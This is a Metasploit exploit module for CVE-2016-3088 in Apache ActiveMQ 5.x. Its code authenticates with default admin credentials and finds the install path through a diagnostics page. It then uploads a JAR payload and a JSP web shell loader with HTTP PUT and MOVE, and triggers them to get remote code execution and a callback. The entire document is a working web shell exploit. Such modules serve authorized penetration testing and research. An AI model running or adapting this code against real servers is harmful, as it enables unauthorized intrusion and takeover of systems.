# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;ActiveMQ web shell upload&#039;,
      &#039;Description&#039; => %q(
        The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0
        allows remote attackers to upload and execute arbitrary files via an
        HTTP PUT followed by an HTTP MOVE request.
      ),
      &#039;Author&#039;      => [ &#039;Ian Anderson <andrsn84[at]gmail.com>&#039;, &#039;Hillary Benson <1n7r1gu3[at]gmail.com>&#039; ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2016-3088&#039; ],
          [ &#039;URL&#039;, &#039;http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => %w{ java linux win },
      &#039;Targets&#039;     =>
        [
          [ &#039;Java Universal&#039;,
            {
              &#039;Platform&#039; => &#039;java&#039;,
              &#039;Arch&#039; => ARCH_JAVA
            }
          ],
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86
            }
          ],
          [ &#039;Windows&#039;,
             {
               &#039;Platform&#039; => &#039;win&#039;,
               &#039;Arch&#039; => ARCH_X86
             }
           ]
        ],
      &#039;DisclosureDate&#039; => "Jun 01 2016",
      &#039;DefaultTarget&#039;  => 0))
    register_options(
      [
        OptString.new(&#039;BasicAuthUser&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;BasicAuthPass&#039;, [ true, &#039;The password for the specified username&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;JSP&#039;, [ false, &#039;JSP name to use, excluding the .jsp extension (default: random)&#039;, nil ]),
        OptString.new(&#039;AutoCleanup&#039;, [ false, &#039;Remove web shells after callback is received&#039;, &#039;true&#039; ]),
        Opt::RPORT(8161)
      ])
    register_advanced_options(
      [
        OptString.new(&#039;UploadPath&#039;, [false, &#039;Custom directory into which web shells are uploaded&#039;, nil])
      ])
  end

  def jsp_text(payload_name)
    %{
    <%@ page import="java.io.*"
    %><%@ page import="java.net.*"
    %><%
    URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath("./#{payload_name}.jar")).toURI().toURL()});
    Class c = cl.loadClass("metasploit.Payload");
    c.getMethod("main",Class.forName("[Ljava.lang.String;")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});
    %>}
  end

  def exploit
    jar_payload = payload.encoded_jar.pack
    payload_name = datastore[&#039;JSP&#039;] || rand_text_alpha(8 + rand(8))
    host = "#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"
    @url = datastore[&#039;SSL&#039;] ? "https://#{host}" : "http://#{host}"
    paths = get_upload_paths
    paths.each do |path|
      if try_upload(path, jar_payload, payload_name)
        break handler if trigger_payload(payload_name)
        print_error(&#039;Unable to trigger payload&#039;)
      end
    end
  end

  def try_upload(path, jar_payload, payload_name)
    [&#039;.jar&#039;, &#039;.jsp&#039;].each do |ext|
      file_name = payload_name + ext
      data = ext == &#039;.jsp&#039; ? jsp_text(payload_name) : jar_payload
      move_headers = { &#039;Destination&#039; => "#{@url}#{path}#{file_name}" }
      upload_uri = normalize_uri(&#039;fileserver&#039;, file_name)
      print_status("Uploading #{move_headers[&#039;Destination&#039;]}")
      register_files_for_cleanup "#{path}#{file_name}" if datastore[&#039;AutoCleanup&#039;].casecmp(&#039;true&#039;)
      return error_out unless send_request(&#039;PUT&#039;, upload_uri, 204, &#039;data&#039; => data) &&
                              send_request(&#039;MOVE&#039;, upload_uri, 204, &#039;headers&#039; => move_headers)
      @trigger_resource = /webapps(.*)/.match(path)[1]
    end
    true
  end

  def get_upload_paths
    base_path = "#{get_install_path}/webapps"
    custom_path = datastore[&#039;UploadPath&#039;]
    return [normalize_uri(base_path, custom_path)] unless custom_path.nil?
    [ "#{base_path}/api/", "#{base_path}/admin/" ]
  end

  def get_install_path
    properties_page = send_request(&#039;GET&#039;, "#{@url}/admin/test/systemProperties.jsp").body
    match = properties_page.tr("\n", &#039;@&#039;).match(/activemq\.home<\/td>@\s*<td>([^@]+)<\/td>/)
    return match[1] unless match.nil?
  end

  def send_request(method, uri, expected_response = 200, opts = {})
    opts[&#039;headers&#039;] ||= {}
    opts[&#039;headers&#039;][&#039;Authorization&#039;] = basic_auth(datastore[&#039;BasicAuthUser&#039;], datastore[&#039;BasicAuthPass&#039;])
    opts[&#039;headers&#039;][&#039;Connection&#039;] = &#039;close&#039;
    r = send_request_cgi(
      {
        &#039;method&#039;  => method,
        &#039;uri&#039;     => uri
      }.merge(opts)
    )
    return false if r.nil? || expected_response != r.code.to_i
    r
  end

  def trigger_payload(payload_name)
    send_request(&#039;POST&#039;, @url + @trigger_resource + payload_name + &#039;.jsp&#039;)
  end

  def error_out
    print_error(&#039;Upload failed&#039;)
    @trigger_resource = nil
    false
  end
end

